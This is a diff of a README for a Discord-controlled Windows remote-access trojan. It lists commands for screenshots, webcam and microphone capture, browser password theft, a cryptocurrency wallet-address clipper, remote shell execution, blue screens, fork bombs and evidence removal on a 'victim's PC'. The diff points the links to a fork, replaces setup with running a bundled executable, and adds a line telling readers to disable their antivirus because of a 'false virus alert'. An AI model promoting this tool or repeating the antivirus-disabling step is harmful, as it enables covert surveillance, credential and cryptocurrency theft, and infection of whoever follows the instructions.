@@ -6,6 +6,7 @@
 
 # Disclaimer
 > Information and code provided on this repository are for educational purposes only. The creator is no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.
+> Disable your antivirus due to false virus alert.
 
 --------------------
 
@@ -51,50 +52,47 @@
 
 # Preparation<br />
 
-`git clone https://github.com/mategol/CDT-malware`<br />
-`cd CDT-malware`<br />
-<a href="https://github.com/mategol/CDT-malware/wiki/Setup">`Create Discord BOT and server`</a><br />
-***Windows:*** `Run the CDT.bat either from Command Line or double clicking on it`<br />
-***Linux:*** `Run the CDT.sh from Command Line`<br />
+Only works on windows:
+Run CDTDRAT.exe
 
 --------------------
 
 # Available commands
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.ss`</a> - take screenshot at any time<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.screenrec`</a> - record the screen for 15 seconds<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.critical-enable`</a> - elevates the process to critical status (`.critical-disable` to undo)<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.display-graphic`</a> - manipulate low-level graphics by displaying pixels prepared in DrawlingStudio<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.display-glitch <name>`</a> - display specified screen glitch<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.monitors-off`</a> - turn off all monitors (`.monitors-on` to turn back on)<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.website-block <website>`</a> - block specified website from being accessed from any browser (`.website-unblock <website>` to unblock it)<br />
-<a href="https://github.com/mategol/CDT-malware#show-what-to-show">          `.show <what-to-show>`</a> - get list of running processes or available commands<br />
-<a href="https://github.com/mategol/CDT-malware#kill-process-id">            `.kill <process-name-or-id>`</a> - kill any running process<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.blacklist <process-name>`</a> - adds specified process to the blacklist (victim won't be able to run it)<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.whitelist <process-name>`</a> - removes specified process from the blacklist (victim will be able to run it) <br />
-<a href="https://github.com/mategol/CDT-malware#kill-process-id">            `.foreground`</a> - get active window process name<br />
-<a href="https://github.com/mategol/CDT-malware#kill-process-id">            `.msg title="<title>" text="<text>" style=<style>`</a> - send a message to victim and get the response<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.tts <message>`</a> - plays a *Text-to-Speech* message on victim's PC<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.webcam <action>`</a> -  use connected webcam (currently supports photos shooting)<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.block-input`</a> - block the mouse and keyboard(`.unblock-input` to unblock it)<br />
-<a href="https://github.com/mategol/CDT-malware#grab-what-to-grab">          `.grab <what-to-grab>`</a> - grab for example saved passwords in web browsers<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.volume <value>`</a> - change the audio output volume on victim's PC<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.play [<file>]`</a> - play any *.mp3* file on the victim's PC (existing one or sent in the next message if no filename was provided)<br />
-<a href="https://github.com/mategol/CDT-malware#join">                       `.join`</a> - join voice-channel and stream live microphone input<br />
-<a href="https://github.com/mategol/CDT-malware#pwd">                        `.pwd`</a> - show working directory<br />
-<a href="https://github.com/mategol/CDT-malware#ls">                         `.ls`</a> - list content of working directory<br />
-<a href="https://github.com/mategol/CDT-malware#tree">                       `.tree`</a> - show tree of working directory<br />
-<a href="https://github.com/mategol/CDT-malware#cd-directory">               `.cd <directory>`</a> - change working directory<br />
-<a href="https://github.com/mategol/CDT-malware#upload-type-filename">       `.upload <type> [<name>]`</a> - upload any file or zipped directory (also greater than 8MB ones) onto target PC<br />
-<a href="https://github.com/mategol/CDT-malware#download-file-or-directory"> `.download <file-or-directory>`</a> - download any file or zipped directory (also greater than 8MB ones) from target PC<br />
-<a href="https://github.com/mategol/CDT-malware#remove-file-or-dir">         `.remove <file-or-directory>`</a> - remove file or directory on target PC<br />
-<a href="https://github.com/mategol/CDT-malware#execute-file">               `.execute <file>`</a> - run any file on target PC<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.start-clipper`</a> - start crypto-clipper (swap crypto currency wallet addresses to your ones)(`.stop-clipper` to stop it)<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.jumpscare [<preset>]`</a> - play very loud and rapidly flashing video or other graphics<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.bsod`</a> - trigger Blue Screen of Death<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.forkbomb`</a> - execute fork bomb<br />
-<a href="https://github.com/mategol/CDT-malware#ss">                         `.cmd <command>`</a> - execute shell command on victim's PC and send back the output<br />
-<a href="https://github.com/mategol/CDT-malware#implode">                    `.implode`</a> - remove CDT from target PC and clean the "evidence"<br />
-<a href="https://github.com/mategol/CDT-malware#clear">                      `.clear`</a> - clear messages from file-related channel<br /
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.ss`</a> - take screenshot at any time<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.screenrec`</a> - record the screen for 15 seconds<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.critical-enable`</a> - elevates the process to critical status (`.critical-disable` to undo)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.display-graphic`</a> - manipulate low-level graphics by displaying pixels prepared in DrawlingStudio<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.display-glitch <name>`</a> - display specified screen glitch<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.monitors-off`</a> - turn off all monitors (`.monitors-on` to turn back on)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.website-block <website>`</a> - block specified website from being accessed from any browser (`.website-unblock <website>` to unblock it)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#show-what-to-show">          `.show <what-to-show>`</a> - get list of running processes or available commands<br />
+<a href="https://github.com/Gun-spec/CDT-malware#kill-process-id">            `.kill <process-name-or-id>`</a> - kill any running process<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.blacklist <process-name>`</a> - adds specified process to the blacklist (victim won't be able to run it)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.whitelist <process-name>`</a> - removes specified process from the blacklist (victim will be able to run it) <br />
+<a href="https://github.com/Gun-spec/CDT-malware#kill-process-id">            `.foreground`</a> - get active window process name<br />
+<a href="https://github.com/Gun-spec/CDT-malware#kill-process-id">            `.msg title="<title>" text="<text>" style=<style>`</a> - send a message to victim and get the response<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.tts <message>`</a> - plays a *Text-to-Speech* message on victim's PC<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.webcam <action>`</a> -  use connected webcam (currently supports photos shooting)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.block-input`</a> - block the mouse and keyboard(`.unblock-input` to unblock it)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#grab-what-to-grab">          `.grab <what-to-grab>`</a> - grab for example saved passwords in web browsers<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.volume <value>`</a> - change the audio output volume on victim's PC<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.play [<file>]`</a> - play any *.mp3* file on the victim's PC (existing one or sent in the next message if no filename was provided)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#join">                       `.join`</a> - join voice-channel and stream live microphone input<br />
+<a href="https://github.com/Gun-spec/CDT-malware#pwd">                        `.pwd`</a> - show working directory<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ls">                         `.ls`</a> - list content of working directory<br />
+<a href="https://github.com/Gun-spec/CDT-malware#tree">                       `.tree`</a> - show tree of working directory<br />
+<a href="https://github.com/Gun-spec/CDT-malware#cd-directory">               `.cd <directory>`</a> - change working directory<br />
+<a href="https://github.com/Gun-spec/CDT-malware#upload-type-filename">       `.upload <type> [<name>]`</a> - upload any file or zipped directory (also greater than 8MB ones) onto target PC<br />
+<a href="https://github.com/Gun-spec/CDT-malware#download-file-or-directory"> `.download <file-or-directory>`</a> - download any file or zipped directory (also greater than 8MB ones) from target PC<br />
+<a href="https://github.com/Gun-spec/CDT-malware#remove-file-or-dir">         `.remove <file-or-directory>`</a> - remove file or directory on target PC<br />
+<a href="https://github.com/Gun-spec/CDT-malware#execute-file">               `.execute <file>`</a> - run any file on target PC<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.start-clipper`</a> - start crypto-clipper (swap crypto currency wallet addresses to your ones)(`.stop-clipper` to stop it)<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.jumpscare [<preset>]`</a> - play very loud and rapidly flashing video or other graphics<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.bsod`</a> - trigger Blue Screen of Death<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.forkbomb`</a> - execute fork bomb<br />
+<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.cmd <command>`</a> - execute shell command on victim's PC and send back the output<br />
+<a href="https://github.com/Gun-spec/CDT-malware#implode">                    `.implode`</a> - remove CDT from target PC and clean the "evidence"<br />
+<a href="https://github.com/Gun-spec/CDT-malware#clear">                      `.clear`</a> - clear messages from file-related channel<br /
 
 ### ToDo
 
